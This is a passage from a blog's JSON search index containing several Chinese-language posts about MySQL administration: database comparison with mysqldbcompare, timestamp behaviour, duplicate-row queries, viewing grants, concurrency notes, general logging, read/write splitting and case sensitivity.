Compare (Commercial)<br>Maatkit (now Percona)<br>liquibase<br>Toad<br>Nob Hill Database Compare (Commercial)<br>MySQL Diff<br>SQL EDT (Commercial)</p>\n</blockquote>\n<p><a href=\"https://stackoverflow.com/questions/225772/compare-two-mysql-databases\" target=\"_blank\" rel=\"noopener\">Compare two MySQL databases - Stack Overflow</a><br><a href=\"https://www.itread01.com/p/444490.html\" target=\"_blank\" rel=\"noopener\">檔案收發系統 - IT閱讀</a></p>\n<p><strong>2019-10-07</strong><br>聽說可以 table 比對 table 產生 sql 語法<br>查了一下還真的有!!<br><a href=\"https://www.youtube.com/watch?v=YzEuCa5Bca0\" target=\"_blank\" rel=\"noopener\">(1) How to Compare two Databases using MySQL Workbench - YouTube</a><br><a href=\"https://www.youtube.com/watch?v=_mpph3mLEt4\" target=\"_blank\" rel=\"noopener\">(1) mysql compare databases and sync | Mysql tutorial - YouTube</a><br><a href=\"https://github.com/mmatuson/SchemaSync\" target=\"_blank\" rel=\"noopener\">mmatuson/SchemaSync: A MySQL Schema Versioning and Migration Utility</a><br><a href=\"https://zeven0707.github.io/2018/10/08/%E4%BD%BF%E7%94%A8mysqldiff%E5%92%8Cmysqldbcompare%E6%AF%94%E8%BE%83%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B7%AE%E5%BC%82/\" target=\"_blank\" rel=\"noopener\">[Mysql] 使用mysqldiff和mysqldbcompare检查数据一致性 | zeven’s blog</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ mysqldbcompare --server1=root:root@localhost --server2=root:root@localhost db1:db2 --changes-for=server1 -a --difftype=sql</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># WARNING: Objects in server1.db1 but not in server1.db2:</span><br><span class=\"line\"># TABLE: table2</span><br><span class=\"line\">#</span><br><span class=\"line\"># WARNING: Objects in server1.db2 but not in server1.tb1:</span><br><span class=\"line\"># TABLE: table3</span><br><span class=\"line\">#</span><br><span class=\"line\">#                                                   Defn    Row     Data</span><br><span class=\"line\"># Type      Object Name                             Diff    Count   Check</span><br><span class=\"line\">#-------------------------------------------------------------------------</span><br><span class=\"line\"># TABLE     t1                                      pass    pass    -</span><br><span class=\"line\">#           - Compare table checksum                                FAIL</span><br><span class=\"line\">#           - Find row differences                                  FAIL</span><br><span class=\"line\">#</span><br><span class=\"line\"># Transformation for --changes-for=server1:</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># Data differences found among rows:</span><br><span class=\"line\">UPDATE db1.t1 SET b = &apos;Test 123&apos; WHERE a = &apos;1&apos;;</span><br><span class=\"line\">UPDATE db1.t1 SET b = &apos;Test 789&apos; WHERE a = &apos;3&apos;;</span><br><span class=\"line\">DELETE FROM db1.t1 WHERE a = &apos;4&apos;;</span><br><span class=\"line\">INSERT INTO db1.t1 (a, b) VALUES(&apos;5&apos;, &apos;New row - db2&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"># Database consistency check failed.</span><br><span class=\"line\">#</span><br><span class=\"line\"># ...done</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.awaimai.com/1531.html\" target=\"_blank\" rel=\"noopener\">mysqldbcompare MySQL数据库比较工具 - 歪麦博客</a></p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL 我對 timestamp 多年的誤解","url":"/blog/2019/09/23/MySQL-%E6%88%91%E5%B0%8D-timestamp-%E5%A4%9A%E5%B9%B4%E7%9A%84%E8%AA%A4%E8%A7%A3/","content":"<p>以前實作上我都使用 datetime<br>沒有選過用 timestamp<br>今天我在找程式問題<br>後來發現我多年對 timestamp 多年誤解</p>\n<a id=\"more\"></a>\n<p>公司使用 int(10) 當 timestamp<br>所以我常常在 phpmyadmin 看到數值的東西</p>\n<p>最近，剛好跟別的公司合作<br>剛好有一個資料表設計是 timestamp<br>由於我在 phpmyadmin 看到 時間格式資料，我以為是 datetime 格式<br>但我跟另外一個資料表裡面用 <code>datetime</code><br>想說時間怎麼對不起來…</p>\n<p>後來發現是 timestamp 是使用 unixtime 時間…(這個我知道)<br>我以為 timestamp 是用數字<br><strong>現在我知道他也是放<code>時間格式</code></strong><br><strong>現在我知道他也是放<code>時間格式</code></strong><br><strong>現在我知道他也是放<code>時間格式</code></strong></p>\n<p>另外我實驗這種也能順利存到 DB 去<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">INSERT INTO test(ts) values(19900101000000);</span><br></pre></td></tr></table></figure></p>\n<p>當然這個時間格式會隨著<code>@@session.time_zone</code> 做改變</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set @@session.time_zone = &apos;+08:00&apos;;</span><br><span class=\"line\">select * from test;</span><br></pre></td></tr></table></figure>\n<p>難怪，之前合作公司說 DB 記得要用 UTC 時間<br>因為這個主機上面有很多人在用，為了方便時間亂掉<br>不過使用 timestamp 方式相信做多國跨域網站真的會比較方便!!</p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL 抓出重複資料方法","url":"/blog/2019/08/21/MySQL-%E6%8A%93%E5%87%BA%E9%87%8D%E8%A4%87%E8%B3%87%E6%96%99%E6%96%B9%E6%B3%95/","content":"<p>最近收到要抓出資料重複(資料量很大)<br>這看起來很簡單，但沒想到讓我想了很久要怎麼做<br>最後實作出來筆記一下</p>\n<a id=\"more\"></a>\n<h2 id=\"EXCEL-過濾法\"><a href=\"#EXCEL-過濾法\" class=\"headerlink\" title=\"EXCEL 過濾法\"></a>EXCEL 過濾法</h2><p>可以透過 Excel 抓重複資料<br>教學: <a href=\"https://blog.gtwang.org/windows/excel-find-highlight-delete-duplicate-row/\" target=\"_blank\" rel=\"noopener\">Excel 找出重複內容，標示或刪除相同資料教學 - G. T. Wang</a><br>之後可以透過 Excel 篩選過濾抓出來(或刪掉)</p>\n<p><del>但我發現我要查詢重複條件有2個以上，所以這招無效</del><br>我剛剛想到用兩個欄位尋找重複資料，再篩選多個資料<br><img src=\"/blog/2019/08/21/MySQL-抓出重複資料方法/1.png\" title=\"Excel抓取重複資料\"></p>\n<img src=\"/blog/2019/08/21/MySQL-抓出重複資料方法/2.png\" title=\"篩選多個資料\">\n<p><del>其實能不用寫程式方法最好</del></p>\n<h2 id=\"SQL-簡單反查法\"><a href=\"#SQL-簡單反查法\" class=\"headerlink\" title=\"SQL 簡單反查法\"></a>SQL 簡單反查法</h2><p>不推薦使用，但適合少資料使用<br>我們知道 MySQL 做重複資料可以用 <code>group by</code> 和 <code>having count(1) &gt; 1</code><br>但是資料表唯一值<code>id</code>就會被過濾掉<br>這不是我們要的</p>\n<p>可以透過重複欄位做 or 反查<br>但是我資料表資料太多<br>這招不行啊!!!</p>\n<h2 id=\"JOIN-方法\"><a href=\"#JOIN-方法\" class=\"headerlink\" title=\"JOIN 方法\"></a>JOIN 方法</h2><p>這一招可以簡單抓到我要的資料<br>但是代價就是需要時間跑</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> a.id,</span><br><span class=\"line\">a.xxxxxx</span><br><span class=\"line\">(<span class=\"keyword\">select</span> xxxxxx <span class=\"keyword\">from</span> oooo r <span class=\"keyword\">where</span> <span class=\"keyword\">id</span> = a.vvvv) <span class=\"keyword\">as</span> v, </span><br><span class=\"line\">a.xxx,</span><br><span class=\"line\">a.xxxx</span><br><span class=\"line\">(<span class=\"keyword\">Select</span> <span class=\"keyword\">count</span>(<span class=\"number\">1</span>) <span class=\"keyword\">from</span> s <span class=\"keyword\">where</span> s.vvv = a.vvvvv) <span class=\"keyword\">count</span>,</span><br><span class=\"line\">(<span class=\"keyword\">Select</span> <span class=\"keyword\">SUBSTRING</span>(<span class=\"keyword\">replace</span>(<span class=\"keyword\">min</span>(i),<span class=\"string\">'-'</span>,<span class=\"string\">''</span>),<span class=\"number\">1</span>,<span class=\"number\">3</span>) <span class=\"keyword\">from</span> s2  <span class=\"keyword\">where</span> s2.id = a.id) <span class=\"keyword\">as</span> s2_t</span><br><span class=\"line\"><span class=\"keyword\">from</span> a1  a  <span class=\"keyword\">inner</span> <span class=\"keyword\">join</span> a1 b <span class=\"keyword\">on</span> a.status=<span class=\"string\">\"active\"</span> <span class=\"keyword\">and</span>  a.name = b.name <span class=\"keyword\">and</span> a.note = b.note <span class=\"keyword\">and</span> a.id != b.id </span><br><span class=\"line\"><span class=\"keyword\">group</span> <span class=\"keyword\">by</span> a.id</span><br></pre></td></tr></table></figure>\n<h2 id=\"最正規的作法\"><a href=\"#最正規的作法\" class=\"headerlink\" title=\"最正規的作法\"></a>最正規的作法</h2><p>有查到可以用大數據的 MapReduce<br>感覺這種東西應該應用在大數據<br>只是我沒研究，就先放著</p>\n<p><a href=\"https://blog.csdn.net/V_code/article/details/54093671\" target=\"_blank\" rel=\"noopener\">Mongo入门：数据去重之MapReduce，Aggregation的简单使用（另附相关网络资源） - V_code的博客 - CSDN博客</a></p>\n<h2 id=\"Excel-備註小記\"><a href=\"#Excel-備註小記\" class=\"headerlink\" title=\"Excel 備註小記\"></a>Excel 備註小記</h2><p>上述因為要抓多個資料，可以先跑一次<br>匯入到自己 localhost DB ，多個條件可以做index，這樣搜尋不用花太多時間</p>\n<h3 id=\"csv檔案編碼\"><a href=\"#csv檔案編碼\" class=\"headerlink\" title=\"csv檔案編碼\"></a>csv檔案編碼</h3><p>DB 是 UTF8 ， CSV 需要用 notepad++ 和 visual studio code 轉 Big5<br>否則 Excel 開會亂碼</p>\n<h3 id=\"多國語系貼到-Excel-要注意的事項\"><a href=\"#多國語系貼到-Excel-要注意的事項\" class=\"headerlink\" title=\"多國語系貼到 Excel 要注意的事項\"></a>多國語系貼到 Excel 要注意的事項</h3><p>可以用 Excel 會入 csv 載入方式 (但需要注意有沒有資料有換行符號，可以先人工把放行用掉，正常應該不會遇到，但我資料有這樣orz)<br>匯入建議把所有資料變成<code>文字</code>，不然會發生資料跑錯欄位情形</p>\n<p>其他相關連結:</p>\n<p><a href=\"https://killworm737.pixnet.net/blog/post/21934570-%5Bmysql%5D%E5%88%A9%E7%94%A8-sql-%E6%89%BE%E5%87%BA%E6%AC%84%E4%BD%8D%E5%80%BC%E9%87%8D%E8%A6%86%E7%9A%84%E8%A8%98%E9%8C%84\" target=\"_blank\" rel=\"noopener\">[MYSQL]利用 SQL 找出欄位值重覆的記錄 @ 紀錄些小事情 :: 痞客邦 ::</a><br><a href=\"https://senkao.pixnet.net/blog/post/28556740-%E5%BE%9Emysql%E8%B3%87%E6%96%99%E5%BA%AB%E4%B8%AD%E6%89%BE%E5%87%BA%E9%87%8D%E8%A4%87%E7%9A%84%E8%B3%87%E6%96%99%E4%B8%A6%E5%88%AA%E9%99%A4\" target=\"_blank\" rel=\"noopener\">從MYSQL資料庫中找出重複的資料並刪除 @ 緒含的部落格 :: 痞客邦 ::</a></p>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL 查看資料表權限","url":"/blog/2019/08/14/MySQL-%E6%9F%A5%E7%9C%8B%E8%B3%87%E6%96%99%E8%A1%A8%E6%AC%8A%E9%99%90/","content":"<p>最近想看資料表有哪些 user 權限<br>因為不常下，所以特別筆記</p>\n<a id=\"more\"></a>\n<p><a href=\"https://dba.stackexchange.com/questions/23265/mysql-show-grants-for-all-users\" target=\"_blank\" rel=\"noopener\">permissions - mysql: Show GRANTs for all users - Database Administrators Stack Exchange</a></p>\n<p>裡面有很多方法，後來挑選出這個，可搭配 where 查詢</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> Host, Db, <span class=\"keyword\">User</span>, Insert_priv, Update_priv, Delete_priv, Create_tmp_table_priv, Alter_priv <span class=\"keyword\">from</span> mysql.db</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://blog.longwin.com.tw/2009/06/query-mysql-show-grant-permission-2009/\" target=\"_blank\" rel=\"noopener\">查詢 MySQL 對 此帳號 開放(GRANT)哪些權限 | Tsung’s Blog</a></p>\n<figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">SHOW</span> <span class=\"keyword\">GRANTS</span>;</span><br><span class=\"line\"><span class=\"keyword\">SHOW</span> <span class=\"keyword\">GRANTS</span> <span class=\"keyword\">FOR</span> <span class=\"keyword\">CURRENT_USER</span>;</span><br><span class=\"line\"><span class=\"keyword\">SHOW</span> <span class=\"keyword\">GRANTS</span> <span class=\"keyword\">FOR</span> <span class=\"keyword\">CURRENT_USER</span>();</span><br></pre></td></tr></table></figure>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL 高併發問題解決小記","url":"/blog/2019/06/01/MySQL-%E9%AB%98%E4%BD%B5%E7%99%BC%E5%95%8F%E9%A1%8C%E8%A7%A3%E6%B1%BA%E5%B0%8F%E8%A8%98/","content":"<p>小記…，有時間補</p>\n<a id=\"more\"></a>\n<h1 id=\"設計資料表-unique\"><a href=\"#設計資料表-unique\" class=\"headerlink\" title=\"設計資料表 unique\"></a>設計資料表 unique</h1><p>這個是我想的，不過網路上感覺很少寫用這個方法<br>但還是有找到少數人有在討論<br>好像滿可行的</p>\n<p>用 DB unique 可以預防同時資料問題<br>或者有限制 enum=[1,2,3]<br>每次資料進來可預防這個問題<br>但是做刪除，在加入可能就比較麻煩</p>\n<h1 id=\"鎖表\"><a href=\"#鎖表\" class=\"headerlink\" title=\"鎖表\"></a>鎖表</h1><p>select …. for update;</p>\n<p>待研究</p>\n<h1 id=\"redis\"><a href=\"#redis\" class=\"headerlink\" title=\"redis\"></a>redis</h1><p>網路爬到有用 redis 解決，有時間在理解<br><a href=\"https://blog.csdn.net/lihao21/article/details/49104695\" target=\"_blank\" rel=\"noopener\">使用 Redis SETNX 命令实现分布式锁 - Leo 的博客 - CSDN 博客</a></p>\n<p><a href=\"https://blog.csdn.net/qq_28018283/article/details/80241090\" target=\"_blank\" rel=\"noopener\">高并发场景下数据重复插入的问题 - LEON 的博客 - CSDN 博客</a><br><a href=\"https://blog.csdn.net/tjcyjd/article/details/8950621\" target=\"_blank\" rel=\"noopener\">如何去掉数据库重复记录并且只保留一条记录 - Java 高知 - CSDN 博客</a><br><a href=\"https://blog.csdn.net/u012721013/article/details/64451644\" target=\"_blank\" rel=\"noopener\">高并发时，进行 insert 操作出现重复记录问题分析 - hansam 的专栏 - CSDN 博客</a><br><a href=\"https://blog.csdn.net/qq_22956867/article/details/72529144\" target=\"_blank\" rel=\"noopener\">java 解决分布式环境中 高并发环境下数据插入重复问题 - 天才白痴梦 - CSDN 博客</a><br><a href=\"https://bbs.csdn.net/topics/391861174\" target=\"_blank\" rel=\"noopener\">并发写数据库如何避免重复数据-CSDN 论坛</a><br><a href=\"https://fishermartyn.github.io/blog/High-traffic-DB-system/\" target=\"_blank\" rel=\"noopener\">如何用DB抗住大量读写的业务 – fishermartyn.github.io</a><br><a href=\"https://blog.iswtf.com/article.php?id=1353\" target=\"_blank\" rel=\"noopener\">处理高并发情况下的DB插入 - isWTF’s blog</a></p>\n","categories":["MySQL"],"tags":["mysql","lock"]},{"title":"MySQL 記錄所有 sql log 方法","url":"/blog/2019/07/11/MySQL-%E8%A8%98%E9%8C%84%E6%89%80%E6%9C%89-sql-log-%E6%96%B9%E6%B3%95/","content":"<p>最近聽說(同事)PHP 用 die 的話，可能不會關掉 PDO 連線<br>但聽說規聽說，Google 都沒有爬到，但我覺得這個我可以自己實驗</p>\n<a id=\"more\"></a>\n<h2 id=\"開-MySQL-LOG-方法\"><a href=\"#開-MySQL-LOG-方法\" class=\"headerlink\" title=\"開 MySQL LOG 方法\"></a>開 MySQL LOG 方法</h2><p>有看到<code>log=/tmp/mysql.log</code>加在<code>[mysqld]</code>就可以了<br>但我一直失敗!!<br>不知道是不是我電腦是 window 關係</p>\n<p>最後找到這篇可以正常執行<br><a href=\"https://www.jonceryang.com/blog/36\" target=\"_blank\" rel=\"noopener\">mysql 在 my.cnf 中配置日志文件路径出错报错:[ERROR] /usr/sbin/mysqld: ambiguous option ‘–log=/var/lib/mysql/mysql.log’ (log-bin, log_slave_updates)</a></p>\n<blockquote>\n<p>解决方法<br>不要用 log 配置项，改用 general_log，具体配置如下：<br>general_log=ON<br>general_log_file=/tmp/mysql.log</p>\n</blockquote>\n<p>其實這個跟我這次實驗沒關係<br>之後想研究 Laravel 想看她的結果</p>\n<h2 id=\"PDO-查看-prepare-SQL-log-長什麼樣子\"><a href=\"#PDO-查看-prepare-SQL-log-長什麼樣子\" class=\"headerlink\" title=\"PDO 查看 prepare SQL log 長什麼樣子\"></a>PDO 查看 prepare SQL log 長什麼樣子</h2><p>原本就是想開 log 看有沒有執行<br>但發現 window 這段就會無效<br>有空我再找 linux 電腦測試<br><a href=\"https://segmentfault.com/q/1010000005714538\" target=\"_blank\" rel=\"noopener\">php - PDO 操作，设置了 ATTR_EMULATE_PREPARES 属性为 false 后发现还是在本地模拟 prepare - SegmentFault 思否</a></p>\n<h2 id=\"PHP-die-exit-會做的事情\"><a href=\"#PHP-die-exit-會做的事情\" class=\"headerlink\" title=\"PHP die/exit 會做的事情\"></a>PHP die/exit 會做的事情</h2><p>經過我測試，die 後會馬上關閉 pdo 連線<br>這是為什麼呢?我好奇去官網找一下答案</p>\n<blockquote>\n<p>Terminates execution of the script. Shutdown functions and object destructors will always be executed even if exit is called.<br>exit is a language construct and it can be called without parentheses if no status is passed.</p>\n</blockquote>\n<p><a href=\"https://www.php.net/manual/en/function.exit.php\" target=\"_blank\" rel=\"noopener\">PHP: exit - Manual</a></p>\n<p>好了，確定沒有這個問題，可以放心的使用這個東西</p>\n","categories":["SQL"],"tags":["mysql","php","log"]},{"title":"MySQLnd 小記","url":"/blog/2019/06/01/MySQLnd-%E5%B0%8F%E8%A8%98/","content":"<p>小記<br>有空實驗，再回去補實做</p>\n<a id=\"more\"></a>\n<p><a href=\"https://stackoverflow.com/questions/1475701/how-to-know-if-mysqlnd-is-the-active-driver\" target=\"_blank\" rel=\"noopener\">php - How to know if MySQLnd is the active driver? - Stack Overflow</a><br><a href=\"https://www.engineyard.com/blog/advanced-read-write-splitting-with-phps-mysqlnd\" target=\"_blank\" rel=\"noopener\">Advanced Read/Write Splitting with PHP’s MySQLnd</a><br><a href=\"https://www.joehorn.idv.tw/tag/mysqlnd/\" target=\"_blank\" rel=\"noopener\">mysqlnd 彙整 - Joe Horn 的啟示錄</a><br><a href=\"https://kknews.cc/zh-tw/other/j5gmg6.html\" target=\"_blank\" rel=\"noopener\">《第 28 天》MySql 讀寫分離，及資料庫高可用負載均衡的實現 - 每日頭條</a><br><a href=\"https://blog.csdn.net/u013421629/article/details/78793966\" target=\"_blank\" rel=\"noopener\">【mysql 读写分离】10 分钟了解读写分离的作用 - 赖德发的博客 - CSDN 博客</a><br><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/535088/\" target=\"_blank\" rel=\"noopener\">mysql 叢集技術：主從複製，讀寫分離 | 程式前沿</a><br><a href=\"https://github.com/bitnami/bitnami-docker-mysql/blob/master/docker-compose-replication.yml\" target=\"_blank\" rel=\"noopener\">bitnami-docker-mysql/docker-compose-replication.yml at master · bitnami/bitnami-docker-mysql</a></p>\n<p>docker 實做 Mysql master salve<br><a href=\"https://github.com/Junnplus/blog/issues/1\" target=\"_blank\" rel=\"noopener\">Mysql Master/Slave Replication With Docker · Issue #1 · Junnplus/blog</a></p>\n<p>其他小記<br><a href=\"https://www.twblogs.net/a/5c015fcdbd9eee7aec4eb87e\" target=\"_blank\" rel=\"noopener\">開源內網 DNS 服務器軟件介紹 - 台部落</a></p>\n<p><strong>2020-06-13</strong></p>\n<p>最近開始寫 Java<br>JDBC 可設定 master slave<br><a href=\"https://dev.mysql.com/doc/connector-j/5.1/en/connector-j-master-slave-replication-connection.html\" target=\"_blank\" rel=\"noopener\">MySQL :: MySQL Connector/J 5.1 Developer Guide :: 8.3 Configuring Master/Slave Replication with Connector/J</a></p>\n<p><a href=\"https://stackoverflow.com/questions/22495722/mysql-master-slave-replication-connect-to-master-even-for-read-queries-does-d\" target=\"_blank\" rel=\"noopener\">spring - Mysql master/slave replication .Connect to master even for read queries? (does Driver “ping” master before going to slave?) - Stack Overflow</a></p>\n<p><a href=\"https://www.iteye.com/topic/143714\" target=\"_blank\" rel=\"noopener\">讨论一下基于Master-Slave数据库模式的J2EE开发的框架选择 - Hibernate - Java - ITeye论坛</a></p>\n"},{"title":"MySQL不錯優化文章&DB雜記","url":"/blog/2018/12/27/MySQL%E4%B8%8D%E9%8C%AF%E5%84%AA%E5%8C%96%E6%96%87%E7%AB%A0-DB%E9%9B%9C%E8%A8%98/","content":"<p>小記網路看到的好文章</p>\n<a id=\"more\"></a>\n<h2 id=\"Mysql-好文\"><a href=\"#Mysql-好文\" class=\"headerlink\" title=\"Mysql 好文\"></a>Mysql 好文</h2><p><a href=\"https://www.jianshu.com/p/d7665192aaaf\" target=\"_blank\" rel=\"noopener\">我必须得告诉大家的 MySQL 优化原理 - 简书</a> <a href=\"/blog/2018/12/27/MySQL不錯優化文章-DB雜記/1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://www.jianshu.com/p/01b9f028d9c7\" target=\"_blank\" rel=\"noopener\">我必须得告诉大家的 MySQL 优化原理 2 - 简书</a> <a href=\"/blog/2018/12/27/MySQL不錯優化文章-DB雜記/2.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://www.jianshu.com/p/78b6b7e2bb7f\" target=\"_blank\" rel=\"noopener\">我必须得告诉你的 MySQL 优化原理 3 - 简书</a> <a href=\"/blog/2018/12/27/MySQL不錯優化文章-DB雜記/3.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://github.com/jobbole/awesome-mysql-cn\" target=\"_blank\" rel=\"noopener\">jobbole/awesome-mysql-cn: MySQL 资源大全中文版，分析工具、备份、性能测试、配置、部署、GUI 等</a></p>\n<h2 id=\"Sharding\"><a href=\"#Sharding\" class=\"headerlink\" title=\"Sharding\"></a>Sharding</h2><p><a href=\"https://www.itread01.com/content/1545726433.html\" target=\"_blank\" rel=\"noopener\">MySql 從一竅不通到入門（五）Sharding：分表、分庫、分片和分割槽 - IT 閱讀</a><br><a href=\"https://www.jianshu.com/p/6ebafabfddae\" target=\"_blank\" rel=\"noopener\">MySQL Sharding 详解 - 简书</a><br><a href=\"https://blog.toright.com/posts/4552/mongodb-sharding-%E5%88%86%E6%95%A3%E5%BC%8F%E5%84%B2%E5%AD%98%E6%9E%B6%E6%A7%8B%E5%BB%BA%E7%BD%AE-%E6%A6%82%E5%BF%B5%E7%AF%87.html/amp\" target=\"_blank\" rel=\"noopener\">MongoDB Sharding 分散式儲存架構建置 (概念篇) - Soul &amp; Shell Blog</a></p>\n<h3 id=\"mariadb-sipder-mysql-sharding\"><a href=\"#mariadb-sipder-mysql-sharding\" class=\"headerlink\" title=\"mariadb sipder(mysql sharding)\"></a>mariadb sipder(mysql sharding)</h3><ul>\n<li><a href=\"https://www.jianshu.com/p/b96a8c90689a\" target=\"_blank\" rel=\"noopener\">Spider 引擎分布式数据库解决方案（最全的 spider 教程） - 简书</a> <a href=\"/blog/2018/12/27/MySQL不錯優化文章-DB雜記/4.png\" title=\"備份圖\">備份圖</a></li>\n<li><a href=\"https://github.com/aipescience/spider-docker\" target=\"_blank\" rel=\"noopener\">aipescience/spider-docker: Docker files for a Spider-Engine MariaDB cluster</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/47418626\" target=\"_blank\" rel=\"noopener\">MySQL 原生的分库分表方案 - Spider 存储引擎 - 知乎</a></li>\n<li><a href=\"https://yq.aliyun.com/articles/80458\" target=\"_blank\" rel=\"noopener\">MySQL 存储引擎之 Spider 内核深度解析-云栖社区-阿里云</a></li>\n<li><a href=\"https://www.jianshu.com/p/efb31df1119c\" target=\"_blank\" rel=\"noopener\">MySQL 中间件 Spider 引擎问题集锦 - 简书</a></li>\n</ul>\n<p>這邊我有自已用<a href=\"https://github.com/aipescience/spider-docker\" target=\"_blank\" rel=\"noopener\">aipescience/spider-docker: Docker files for a Spider-Engine MariaDB cluster</a><br>做一個簡單環境<br>再搭配了<a href=\"https://www.jianshu.com/p/b96a8c90689a\" target=\"_blank\" rel=\"noopener\">Spider 引擎分布式数据库解决方案（最全的 spider 教程） - 简书</a>教學做出一個 Sipder 環境<br>使用結論：在使用 Sipder 做 alter table 時候，後面的 DB 不會跟著改變<br>必須各別調整，在管理上面感覺不會非常方便<br>不知道是不是有很好用的部屬工具可以解決?</p>\n<p><a href=\"https://millenniummeetonce.blogspot.com/2015/12/clusterha.html\" target=\"_blank\" rel=\"noopener\">Cluster 和 HA 的差別</a><br><a href=\"https://ithelp.ithome.com.tw/questions/10087065\" target=\"_blank\" rel=\"noopener\">Server NLB 和 Cluster 架構 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></p>\n<h2 id=\"binlog\"><a href=\"#binlog\" class=\"headerlink\" title=\"binlog\"></a>binlog</h2><ul>\n<li><a href=\"https://xcoder.in/2015/08/10/mysql-binlog-try/\" target=\"_blank\" rel=\"noopener\">初探 MySQL 的 Binlog · 一个伪宅级别的码畜。</a></li>\n<li><a href=\"https://blog.longwin.com.tw/2009/04/mysql-binlog-recovery-range-by-date-time-2009/\" target=\"_blank\" rel=\"noopener\">MySQL 使用 binary log 回復 某段時間區間 的資料 | Tsung’s Blog</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/33504555\" target=\"_blank\" rel=\"noopener\">腾讯工程师带你深入解析 MySQL binlog - 知乎</a></li>\n<li><a href=\"http://adalf0722.blogspot.com/2014/11/mysqlbinlog.html\" target=\"_blank\" rel=\"noopener\">adalf 的小技巧: [MySQL]查看 Binlog 的內容</a></li>\n</ul>\n<h2 id=\"RabbitMQ-kafka\"><a href=\"#RabbitMQ-kafka\" class=\"headerlink\" title=\"RabbitMQ kafka\"></a>RabbitMQ kafka</h2><p><a href=\"https://www.zhihu.com/question/275090117\" target=\"_blank\" rel=\"noopener\">Kafka、RabbitMQ、RocketMQ 之间的区别是什么 ? - 知乎</a><br><a href=\"https://juejin.im/post/5b32044ef265da59654c3027\" target=\"_blank\" rel=\"noopener\">消息中间件部署及比较：rabbitMQ、activeMQ、zeroMQ、rocketMQ、Kafka、redis - 掘金</a></p>\n<h3 id=\"kafka\"><a href=\"#kafka\" class=\"headerlink\" title=\"kafka\"></a>kafka</h3><ul>\n<li><a href=\"https://tomoyadeng.github.io/blog/2018/06/02/kafka-cluster-in-docker/\" target=\"_blank\" rel=\"noopener\">使用 Docker 快速搭建 Kafka 开发环境 | Tomoya’s Blog</a></li>\n<li><a href=\"http://www.jasongj.com/2015/01/02/Kafka%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/index.html\" target=\"_blank\" rel=\"noopener\">Kafka 深度解析 | 技术世界 | kafka,大数据,集群,kafka 架构,技术世界,郭俊 Jason,大数据架构,Kafka HA,kafka benchmark,kafka split brain,kafka 脑裂</a></li>\n<li><a href=\"http://dockone.io/article/565\" target=\"_blank\" rel=\"noopener\">在 Docker 上运行 Apache Kafka - DockOne.io</a></li>\n<li><a href=\"https://ithelp.ithome.com.tw/articles/10192284\" target=\"_blank\" rel=\"noopener\">[Day06] Kaggle 的解題挑戰 - Kafka 實作 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n</ul>\n","categories":["MySQL"],"tags":["mysql"]},{"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","url":"/blog/2018/08/28/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/","content":"<p>其實對MySQL管理那一塊真的不是很熟<br>但最近踩到一堆雷<br>還是記一下 Linux跟Windows運行MySQL會不一樣的雷<br>哪天說不定還會踩到orz</p>\n<a id=\"more\"></a>\n<h2 id=\"MySQL在Linux下預設有分大小寫\"><a href=\"#MySQL在Linux下預設有分大小寫\" class=\"headerlink\" title=\"MySQL在Linux下預設有分大小寫\"></a>MySQL在Linux下預設有分大小寫</h2><p>之前在玩Docker發現MySQL底下，Linux有分大小寫<br>奇怪，為什麼我大學在Windows下就沒事<br>當初在轉docker時候遇到這個問題<br>當下就只記window大小寫沒分，Linux有分大小寫<br>但沒有理解為什麼<br>不過，今天有爬到<a href=\"https://blog.csdn.net/postnull/article/details/72455768\" target=\"_blank\" rel=\"noopener\">MySQL表名大小写敏感导致的问题 - CSDN博客</a><br>原來用window同一個目錄不能存在<code>test.txt</code>和<code>Test.txt</code>這兩個檔案(我用window20多年都不知道有這個問題 囧)</p>\n<h3 id=\"查看是否有用大小寫變數\"><a href=\"#查看是否有用大小寫變數\" class=\"headerlink\" title=\"查看是否有用大小寫變數\"></a>查看是否有用大小寫變數</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">show variables like &apos;%lower_case_table_names%&apos;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"修改大小寫方法\"><a href=\"#修改大小寫方法\" class=\"headerlink\" 